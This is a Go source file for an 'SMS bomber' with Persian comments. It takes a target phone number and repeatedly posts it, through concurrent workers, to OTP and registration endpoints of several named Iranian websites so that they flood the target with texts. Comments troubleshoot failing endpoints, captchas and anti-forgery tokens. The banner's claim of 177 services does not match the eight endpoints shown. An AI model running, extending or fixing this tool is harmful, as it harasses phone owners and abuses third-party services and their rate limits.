package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"    
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
	const retryDelay = 2 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			// بررسی نوع خطا برای تلاش مجدد
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError // یا شاید کد خطای دیگری برای خطاهای شبکه
					return
				}
				time.Sleep(retryDelay)
				continue // برو به تلاش بعدی
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 // سیگنال لغو
				return
			} else {
				// خطای غیرمنتظره یا غیرمرتبط با شبکه که نباید تلاش مجدد شود
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// اگر درخواست موفق بود (بدون خطا در ارسال)، وضعیت را میفرستیم و خارج میشویم
		ch <- resp.StatusCode
		resp.Body.Close() // بستن بدنه پاسخ پس از استفاده
		return // درخواست موفق بود، نیازی به تلاش مجدد نیست
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
	const retryDelay = 3 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel() 
	}()

	tasks := make(chan func(), repeatCount*40) 


	numWorkers := 20

	var wg sync.WaitGroup
	ch := make(chan int, repeatCount*40) 

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task() 
			}
		}()
	}
// حلقه اصلی برای تعریف و ارسال کارها به کانال tasks
	for i := 0; i < repeatCount; i++ {
		// بررسی لغو Context قبل از ارسال هر بلوک از وظایف
		select {
		case <-ctx.Done():
			fmt.Println("\033[01;33m[!] Task dispatching canceled.\033[0m")
			goto endOfDispatch // پرش به انتهای حلقه
		default:
			// ادامه ارسال وظایف
		}

		// ---- API هایی که پیام ارسال نکردند (نیاز به بررسی بیشتر) ----

		// 1. api.achareh.co (JSON) - گزارش شده کار نکرده. Payload ساده است.
		// احتمالات: نیاز به هدرهای خاص (مثل User-Agent, Origin)، یا اعتبارسنجی سمت سرور بر اساس IP یا شماره.
		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// 5. api.timcheh.com (JSON) - گزارش شده کار نکرده. Payload ساده است.
		// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور، یا URL دقیقاً صحیح نیست.
		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// 6. modiseh.com (Form) - گزارش شده کار نکرده. نیاز به توکن های داینامیک و احتمالاً کپچا دارد.
		// این API بدون پیاده سازی مکانیزم استخراج form_key, referer و حل کپچا از صفحه وب کار نخواهد کرد.
		// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد که فراتر از یک درخواست ساده است.
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("otp_code", "")
			formData.Set("login[username]", "")
			formData.Set("username", phone)
			formData.Set("pass", "")
			formData.Set("my_pass", "")
			formData.Set("is_force_login", "")
			formData.Set("customer_set_password", "")
			formData.Set("customer_set_password2", "")
			formData.Set("form_key", "NtheYMn1kIgW0qqQ") // ⚠️ داینامیک
			formData.Set("type", "enter_mobile")
			formData.Set("captcha[user_login]", "123456") // ⚠️ کپچا
			formData.Set("referer", "aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v") // ⚠️ داینامیک (Base64 encoded URL)
			formData.Set("otp_token", "")
			sendFormRequest(ctx, "https://www.modiseh.com/customer/account/loginpost/", formData, &wg, ch)
		}

		// 7. shixon.com (Form) - گزارش شده کار نکرده. نیاز به توکن __RequestVerificationToken داینامیک دارد.
		// این API بدون پیاده سازی مکانیزم استخراج __RequestVerificationToken از صفحه وب کار نخواهد کرد.
		// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد. فیلد "P" هم مشکوک است.
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("M", phone)
			formData.Set("P", "123456789") // ⚠️ مشکوک
			formData.Set("s", "888")
			formData.Set("PU", "")
			formData.Set("__RequestVerificationToken", "3otZwhYPKHgFR1b-1dRGDdyKPJNqaPhyqOB1AFP5YM5mg1PDbeFfMxqn_kKN3yTp3qRlXKh9f13F1jfvWzs0ZUxTOTp9jQPRTHh2jqV_FeE1") // ⚠️ داینامیک
			sendFormRequest(ctx, "https://www.shixon.com/Home/RegisterUser", formData, &wg, ch)
		}

		// 8. dast2.com (JSON) - گزارش شده کار نکرده. Payload ساده است.
		// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور.
		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://dast2.com/token", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}

		// 9. api.esam.ir (JSON) - گزارش شده کار نکرده. Payload شامل فیلدهای متعدد است.
		// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور، یا مشکل در فیلد serialNumber با مقدار خالی.
		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) و مستندات API (اگر موجود است) را بررسی کنید.
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.esam.ir/api/account/v3/RegisterUserv3", map[string]interface{}{
				"mobile": phone,
				"present_type": "WebApp",
				"registration_method": 0,
				"serialNumber": "", // ⚠️ ممکن است نیاز به مقدار دیگری باشد یا کلا نباید ارسال شود اگر خالی است
			}, &wg, ch)
		}

		// 11. lioncomputer.com (Form) - گزارش شده کار نکرده. خطای Redirect میدهد.
		// این URL به احتمال زیاد نقطه پایانی صحیح برای دریافت مستقیم درخواست POST با این Payload نیست
		// یا نیاز به هدرهای خاصی دارد که باعث عدم Redirect شود.
		// ⚠️ این مورد نیاز به بررسی دقیق جریان لاگین در سایت و یافتن نقطه پایانی صحیح API دارد.
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			formData.Set("redirect_url", "https://www.lioncomputer.com")
			sendFormRequest(ctx, "https://www.lioncomputer.com/api/v1/auth/send-register-code", formData, &wg, ch)
		}

		// 12. account.bama.ir (Form) - گزارش شده کار نکرده. Payload ساده است.
		// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور.
		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("username", phone)
			formData.Set("client_id", "popuplogin")
			sendFormRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
		}

		// ... (API هایی که قبلاً کار می کردند و می خواهید اضافه کنید) ...

	} // پایان حلقه repeatCount

close(tasks)


	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش کدهای وضعیت دریافت شده از کانال ch
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 { // کد وضعیت 0 برای درخواست های لغو شده توسط Context
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
